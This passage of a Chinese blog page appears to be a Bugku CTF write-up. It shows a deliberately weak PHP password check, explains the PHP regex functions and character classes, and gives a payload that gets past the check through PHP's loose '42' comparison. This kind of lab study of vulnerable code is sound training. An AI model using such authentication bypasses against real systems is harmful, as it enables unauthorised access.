+<h5 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line">if ("POST" == $_SERVER['REQUEST_METHOD'])&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">password = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span></span><br><span class="line">//1、正则匹配，[:graph:]为任意字符，要求password长度超过12</span><br><span class="line">	if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))&#123;</span><br><span class="line">		echo 'flag';</span><br><span class="line">		exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)&#123;</span><br><span class="line">//2、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过6次</span><br><span class="line"><span class="meta">	$</span><span class="bash">reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span></span><br><span class="line">	if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">		break;</span><br><span class="line">//c为字符种类，</span><br><span class="line"><span class="meta">	$</span><span class="bash">c = 0;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">ps = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span></span><br><span class="line">	//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]]任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">//标点符号，数字，大写字母，小写字母，包含3种以上绕过</span><br><span class="line">	foreach ($ps as $pt)&#123;</span><br><span class="line">		if (preg_match("/[[:$pt:]]+/", $password))</span><br><span class="line"><span class="meta">			$</span><span class="bash">c += 1;</span></span><br><span class="line">	&#125;</span><br><span class="line">	if ($c &lt; 3) break;</span><br><span class="line"><span class="meta">//&gt;</span><span class="bash">=3，必须包含四种类型三种与三种以上</span></span><br><span class="line">//4、弱类型比较，42abc,强制转换为数字</span><br><span class="line">	if ("42" == $password) echo $flag;</span><br><span class="line">	else </span><br><span class="line">		echo 'Wrong password';</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>preg_match()</strong></p>
+<p>定义：</p>
+<ul>
+<li>执行一个正则表达式匹配</li>
+</ul>
+<p>语法：preg_math（pattern,string,matches,flags）</p>
+<ul>
+<li>pattern,必需，要搜索的模式</li>
+<li>string,必需，输入的字符串</li>
+<li>返回pattern的匹配次数，0次（不匹配）或1次，匹配成功第一次就会停止搜索。</li>
+</ul>
+<p><strong>preg_match_all()</strong></p>
+<p>与preg_match的区别：</p>
+<ul>
+<li>返回匹配完整次数（可能是0），或者发生错误后返回FALSE，匹配完整个字符串。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>名字</th>
+<th>ASCII</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>[:alnum:]</td>
+<td>[a-zA-Z0-9]</td>
+</tr>
+<tr>
+<td>[:alpha:]</td>
+<td>[a-zA-Z]</td>
+</tr>
+<tr>
+<td>[:ascii:]</td>
+<td>[\x00-\x7F]</td>
+</tr>
+<tr>
+<td>[:blank:]</td>
+<td>[ \t]</td>
+</tr>
+<tr>
+<td>[:digit:]</td>
+<td>[0-9]</td>
+</tr>
+<tr>
+<td>[:graph:]</td>
+<td>[\x21-\x7E]</td>
+</tr>
+<tr>
+<td>[:punct:]</td>
+<td>[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~]</td>
+</tr>
+<tr>
+<td>[:lower:]</td>
+<td>[a-z]</td>
+</tr>
+<tr>
+<td>[:upper:]</td>
+<td>[A-Z]</td>
+</tr>
+<tr>
+<td>[:word:]</td>
+<td>[A-Za-z0-9_]</td>
+</tr>
+<tr>
+<td>[:xdigit:]</td>
+<td>[A-Fa-f0-9]</td>
+</tr>
+</tbody></table>
+<p>这一关有bug就算只输入?password=都能返回flag</p>
+<p>只要能够满足条件都行，是Post传参</p>
+<p>payload:<code>42ccccccc.ffffffF</code></p>
+<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716153636587.png" alt="image-20200716153636587"></p>
+<h5 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h5><p>打不开</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/07/25/%E7%A5%9E%E9%A9%AC%E5%9F%B9%E8%AE%AD/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          神马培训
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/07/25/docker/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">docker</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="bugku" data-title="bugku" data-url="https://zhanqiaozai.github.io/2020/07/25/bugku/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="bugku">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2020 zhanqiaozai
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
